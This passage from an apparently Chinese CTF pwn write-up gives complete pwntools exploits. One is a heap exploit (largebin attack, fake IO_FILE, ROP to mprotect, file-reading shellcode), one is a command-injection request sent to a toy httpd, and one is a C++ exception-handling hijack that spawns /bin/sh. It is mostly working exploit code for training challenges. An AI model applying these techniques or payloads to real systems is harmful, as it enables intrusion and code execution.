class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#p = remote()</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>list1 = [<span class="hljs-string">b&quot;car&quot;</span> , <span class="hljs-string">b&quot;train&quot;</span> , <span class="hljs-string">b&quot;plane&quot;</span>]<br>list2 = [<span class="hljs-string">b&#x27;guangzhou&#x27;</span> , <span class="hljs-string">b&#x27;nanning&#x27;</span> , <span class="hljs-string">b&#x27;changsha&#x27;</span> , <span class="hljs-string">b&#x27;nanchang&#x27;</span> , <span class="hljs-string">b&#x27;fuzhou&#x27;</span> ]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">t,c1,c2,f,n</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;car/train/plane?\n&quot;</span>,list1[t])<br>    p.sendlineafter(<span class="hljs-string">b&quot;From where?\n&quot;</span>,list2[c1])<br>    p.sendlineafter(<span class="hljs-string">b&quot;To where?\n&quot;</span>,list2[c2])<br>    p.sendlineafter(<span class="hljs-string">b&quot;How far?\n&quot;</span>,<span class="hljs-built_in">str</span>(f).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;Note:\n&quot;</span>,n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">c1,c2</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;From where?\n&quot;</span>,list2[c1])<br>    p.sendlineafter(<span class="hljs-string">b&quot;To where?\n&quot;</span>,list2[c2])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">c1,c2</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;From where?\n&quot;</span>,list2[c1])<br>    p.sendlineafter(<span class="hljs-string">b&quot;To where?\n&quot;</span>,list2[c2])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">c1,c2,w,f,n</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;From where?\n&quot;</span>,list2[c1])<br>    p.sendlineafter(<span class="hljs-string">b&quot;To where?\n&quot;</span>,list2[c2])<br>    p.sendlineafter(<span class="hljs-string">b&quot;change?\n&quot;</span>,<span class="hljs-built_in">str</span>(w).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;How far?\n&quot;</span>,<span class="hljs-built_in">str</span>(f).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;Note:\n&quot;</span>,n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">c1</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.\n&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;travel?\n&#x27;</span>,list2[c1])<br><br>p.recvuntil(<span class="hljs-string">b&quot;**\n&quot;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">999</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">999</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">999</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 2</span><br>calc(<span class="hljs-number">3</span>)<br>dele(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <br>dele(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 5</span><br>dele(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment"># 7</span><br>show(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_addr - <span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>dele(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;b&#x27;</span>) <span class="hljs-comment"># 8 add时unsorted bin会首先进行排序，这里会放入largebin</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 9</span><br>show(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Note:&#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = heap_addr - <span class="hljs-number">0x001462</span><br>log.success(<span class="hljs-string">&quot;heap_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 10</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 11</span><br>dele(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>dele(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 12</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,p32(<span class="hljs-number">4</span>)+p32(<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x2000</span>)+p32(<span class="hljs-number">10</span>)) <span class="hljs-comment"># 13</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 14</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 15</span><br><br>orw = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push   0x67616c66</span><br><span class="hljs-string">dec    eax</span><br><span class="hljs-string">mov    edi,  esp</span><br><span class="hljs-string">xor    esi,  esi</span><br><span class="hljs-string">push   0x2</span><br><span class="hljs-string">pop    eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">dec    eax</span><br><span class="hljs-string">mov    edi,  eax</span><br><span class="hljs-string">dec    eax</span><br><span class="hljs-string">mov    esi,  esp</span><br><span class="hljs-string">mov    edx,  0x100</span><br><span class="hljs-string">xor    eax,  eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov    edi,  0x1</span><br><span class="hljs-string">dec    eax</span><br><span class="hljs-string">mov    esi,  esp</span><br><span class="hljs-string">push   0x1</span><br><span class="hljs-string">pop    eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = <span class="hljs-string">b&#x27;hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&#x27;</span><br><br>fake_IO_FILE = heap_base + <span class="hljs-number">0x38a0</span><br><br><span class="hljs-comment"># 构建IO_FILE_plus结构体</span><br>f = flat(&#123;<br>    <span class="hljs-number">0x0</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags</span><br>    <span class="hljs-number">0x8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_ptr</span><br>    <span class="hljs-number">0x10</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_end</span><br>    <span class="hljs-number">0x18</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_base</span><br>    <span class="hljs-number">0x20</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_base</span><br>    <span class="hljs-number">0x28</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_ptr</span><br>    <span class="hljs-number">0x30</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_end</span><br>    <span class="hljs-number">0x38</span>: p64(fake_IO_FILE + <span class="hljs-number">0x280</span>), <span class="hljs-comment"># _IO_buf_base</span><br>    <span class="hljs-number">0x40</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_buf_end</span><br>    <span class="hljs-number">0x48</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_save_base</span><br>    <span class="hljs-number">0x50</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_backup_base</span><br>    <span class="hljs-number">0x58</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_save_end</span><br>    <span class="hljs-number">0x60</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># markers</span><br>    <span class="hljs-number">0x68</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _chain</span><br>    <span class="hljs-number">0x70</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _fileno</span><br>    <span class="hljs-number">0x74</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags2</span><br>    <span class="hljs-number">0x78</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _old_offset</span><br>    <span class="hljs-number">0x80</span>: p16(<span class="hljs-number">0</span>), <span class="hljs-comment"># _cur_column</span><br>    <span class="hljs-number">0x82</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _vtable_offset</span><br>    <span class="hljs-number">0x83</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _shortbuf</span><br>    <span class="hljs-number">0x88</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _lock</span><br>    <span class="hljs-number">0x90</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _offset</span><br>    <span class="hljs-number">0x98</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _codecvt</span><br>    <span class="hljs-number">0xa0</span>: p64(fake_IO_FILE + <span class="hljs-number">0xe0</span>), <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xa8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _freeres_list</span><br>    <span class="hljs-number">0xb0</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _freeres_buf</span><br>    <span class="hljs-number">0xb8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># __pad5</span><br>    <span class="hljs-number">0xc0</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _mode</span><br>    <span class="hljs-number">0xc4</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _unused2</span><br>    <span class="hljs-number">0xd8</span>: p64(libc_base + <span class="hljs-number">0x2170c0</span>), <span class="hljs-comment">#_vtables</span><br>    &#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>data = <span class="hljs-built_in">bytes</span>(f).ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment">#在fake_IO_FILE+0xe0处构建_wide_data结构体</span><br>data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span> <span class="hljs-comment"># 填充_wide_data结构体，后面就是_wide_vtable的位置</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x200</span>) <span class="hljs-comment">#在_wide_vtable处写上fake_IO_FILE+0x200，后续在fake_IO_FILE+0x200处伪造_IO_jump_t</span><br>data = data.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment">#在fake_IO_FILE+0x200处伪造_IO_jump_t</span><br>data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span><br>data += p64(libc_base+<span class="hljs-number">0x15d48a</span>) <span class="hljs-comment"># 0x000000000015d48a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]  rdi+0x38即f._IO_buf_base</span><br>data = data.ljust(<span class="hljs-number">0x280</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment">#其他数据</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)+p64(<span class="hljs-number">0</span>)<br>data += p64(libc_base+<span class="hljs-number">0x162f64</span>) <span class="hljs-comment"># 0x0000000000162f64 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]</span><br>data = data.ljust(<span class="hljs-number">0x2a0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2e0</span>)<br>data += p64(libc_base + <span class="hljs-number">0x167420</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span> <span class="hljs-comment"># mov rdx,QWORD PTR [rdi+0x8] ; mov QWORD PTR [rsp],rax ; call QWORD PTR [rdx+0x20]</span><br>data += p64(fake_IO_FILE + <span class="hljs-number">0x2a0</span>)<br>data = data.ljust(<span class="hljs-number">0x2e0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>data += p64(libc_base + <span class="hljs-number">0xd2ba5</span>)+<span class="hljs-number">0x18</span>*<span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># add rsp,0x20 ; pop rbx ; ret</span><br>data += p64(libc_base + <span class="hljs-number">0x5a120</span>)+<span class="hljs-number">0x8</span>*<span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># mov_rsp_rdx</span><br><br>data += p64(libc_base + <span class="hljs-number">0x2a3e5</span>) <span class="hljs-comment"># pop_rdi</span><br>data += p64(heap_base)<br>data += p64(libc_base + <span class="hljs-number">0x2be51</span>) <span class="hljs-comment"># pop_rsi</span><br>data += p64(<span class="hljs-number">0x10000</span>)<br>data += p64(libc_base + <span class="hljs-number">0x904a9</span>) <span class="hljs-comment"># pop_rdx_rbx</span><br>data += p64(<span class="hljs-number">7</span>)<br>data += p64(<span class="hljs-number">0</span>)<br>data += p64(libc.sym.mprotect + libc_base)<br>data += p64(fake_IO_FILE + <span class="hljs-number">0x380</span>)<br>data = data.ljust(<span class="hljs-number">0x380</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>data += shellcode<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">999</span>,data[<span class="hljs-number">0x20</span>:]) <span class="hljs-comment"># 16 # victim,在后续攻击中在IO_list_all上写这个堆块的地址</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">999</span>,<span class="hljs-string">b&#x27;gap&#x27;</span>) <span class="hljs-comment"># 17</span><br>dele(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 释放2 2堆块</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">999</span>,<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x100</span>) <span class="hljs-comment">#18 # 将2 2堆块置入largebin</span><br>dele(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 将 2 4 堆块置入unsorted bin</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">99</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x500</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x531</span>)+p64(libc_base+<span class="hljs-number">0x21b110</span>)+p64(libc_base+<span class="hljs-number">0x21b110</span>)+p64(heap_base+<span class="hljs-number">0x2e50</span>)+p64(libc_base+libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]-<span class="hljs-number">0x20</span>)) <span class="hljs-comment"># 溢出布置largebin</span><br><br><span class="hljs-comment"># largebin attack,利用将unsorted bin中的堆块放入largebin进行攻击</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">999</span>,<span class="hljs-string">b&quot;b&quot;</span>) <span class="hljs-comment"># 19</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;5. Calculate the distance.\n&#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br>p.interactive()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h1><p>出题人手写的httpd<br>含有目录穿越检测、字符串waf<br>但是根本不严，随便绕过</p><p>发两次包即可<br>第一次将flag复制到html目录下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cp%20/flag%20/home/ctf/html</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure><p>第二次直接读取flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/flag</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure><h1 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h1><p>trace函数有数组溢出，可以修改”Buffer overflow”这个字符串<br>warn函数同样有个溢出，不过会在溢出后触发c++的异常处理机制</p><p>我们需要攻击的就是这个异常处理机制，通过溢出，我们可以使触发异常后执行到任意一个catch块中<br>并且我们发现正好有个cacth块中调用了system函数，并且其参数正好就是Buffer overflow字符串所在的位置</p><p>所有我们可以通过溢出修改Buffer overflow为&#x2F;bin&#x2F;sh<br>再通过c++异常处理调用到改catch块中拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment">#context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br>local32_libc = <span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span><br>local64_libc = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>remote_libc = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br>libc = ELF(local64_libc)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote()</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">command</span>(<span class="hljs-params">option</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;chocie&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(option),<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Trace</span>(<span class="hljs-params">Content,records=<span class="hljs-string">b&#x27;y&#x27;</span></span>):<br>    command(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;here&#x27;</span>)<br>    p.send(Content)<br>    p.recvuntil(<span class="hljs-string">b&#x27;records?&#x27;</span>)<br>    p.sendline(records)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Warn</span>(<span class="hljs-params">plz</span>):<br>    command(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;plz&#x27;</span>)<br>    p.send(plz)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    Trace(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>Trace(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>unwind_try = <span class="hljs-number">0x401BC7</span><br>bss = <span class="hljs-number">0x404000</span>+<span class="hljs-number">0x50</span>+<span class="hljs-number">0x500</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x70</span><br>payload+= p64(bss) + p64(unwind_try)<br><br>gdb.attach(p)<br><br>Warn(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="hard-sandbox"><a href="#hard-sandbox" class="headerlink" title="hard+sandbox"></a>hard+sandbox</h1><p>这个题难在如何绕过沙箱，关于shellcode如何编写的我在<a href="/pwn/shellcode/#fork-ptrace">shellcode</a>这篇文章中写了</p><p>本题没有禁用openat2，但本题不支持该系统调用<br>因为openat2系统调用是在kernel5.6版本引入的，因此ubuntu20.04及以下的版本是不支持该系统调用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 